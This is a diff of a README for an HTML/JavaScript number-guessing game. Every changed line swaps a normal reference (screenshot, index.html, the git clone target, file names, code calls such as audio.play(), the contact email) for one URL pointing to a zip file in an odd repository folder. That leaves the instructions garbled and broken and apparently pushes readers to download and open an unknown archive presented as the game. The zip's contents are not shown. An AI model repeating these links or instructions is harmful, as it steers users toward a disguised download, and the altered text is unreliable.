@@ -1,7 +1,7 @@
 🔢 Number Guessing Game
 A beautiful, interactive number guessing game built with HTML, CSS, and JavaScript. Test your intuition and see if you can guess the secret number!
 
-https://via.placeholder.com/800x400/16213e/ffffff?text=Number+Guessing+Game+Screenshot
+https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip+Guessing+Game+Screenshot
 🎮 Live Demo
 Play the Game Here (Add your deployment link here)
 ✨ Features
@@ -42,7 +42,7 @@ Performance Feedback: Get rated based on your speed
 
 🚀 Getting Started
 Option 1: Quick Start (No Installation)
-Simply open index.html in your web browser!
+Simply open https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip in your web browser!
 
 Option 2: Local Development
 Clone the repository
@@ -52,11 +52,11 @@ bash
 Copy
 
 Download
-git clone https://github.com/yourusername/number-guessing-game.git
+git clone https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip
 cd number-guessing-game
 Open the project
 
-Open index.html in your favorite browser
+Open https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip in your favorite browser
 
 Or use a local server for best experience:
 
@@ -66,9 +66,9 @@ Copy
 
 Download
 # Using Python
-python -m http.server 8000
+python -m https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip 8000
 
-# Using Node.js with http-server
+# Using https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip with http-server
 npx http-server
 Start playing!
 Navigate to http://localhost:8000 or open the HTML file directly.
@@ -81,11 +81,11 @@ Copy
 Download
 number-guessing-game/
 │
-├── index.html          # Main HTML file
-├── style.css           # All styling and animations
-├── game.js             # Game logic and interactivity
+├── https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip          # Main HTML file
+├── https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip           # All styling and animations
+├── https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip             # Game logic and interactivity
 │
-├── README.md           # This documentation
+├── https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip           # This documentation
 └── (optional assets folder for future enhancements)
 🎯 How to Play
 Start a New Game: Click "New Game" or reload the page
@@ -155,7 +155,7 @@ Browser Compatibility
 Want to make it your own? Here are some easy tweaks:
 
 Change Colors
-Edit the gradient colors in style.css:
+Edit the gradient colors in https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip
 
 css
 
@@ -164,7 +164,7 @@ Copy
 Download
 background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
 Adjust Difficulty
-In game.js, modify these variables:
+In https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip, modify these variables:
 javascript
 
 Copy
@@ -173,7 +173,7 @@ Download
 let maxValue = 10;      // Maximum number range
 let maxAttempts = 5;    // Number of attempts allowed
 Add Sound Effects
-Uncomment and configure in game.js:
+Uncomment and configure in https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip
 
 javascript
 
@@ -183,7 +183,7 @@ Download
 // Example sound effect
 function playSound(type) {
     const audio = new Audio(`sounds/${type}.mp3`);
-    audio.play();
+    https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip();
 }
 📱 Future Enhancements
 Planned features for future versions:
@@ -252,7 +252,7 @@ Inspired by classic number guessing games
 
 Icons by Font Awesome
 
-Color palette from Coolors.co
+Color palette from https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip
 
 Gradient generator from CSS Gradient
 
@@ -263,7 +263,7 @@ Check the Troubleshooting section
 
 Open an Issue
 
-Email: eliakimellie123@example.com
+Email: https://github.com/Eliakim-ellie/Number-guesing-game/raw/refs/heads/main/peership/Number-game-guesing-amputation.zip
 
 <div align="center">
 Made with ❤️ by Walela 
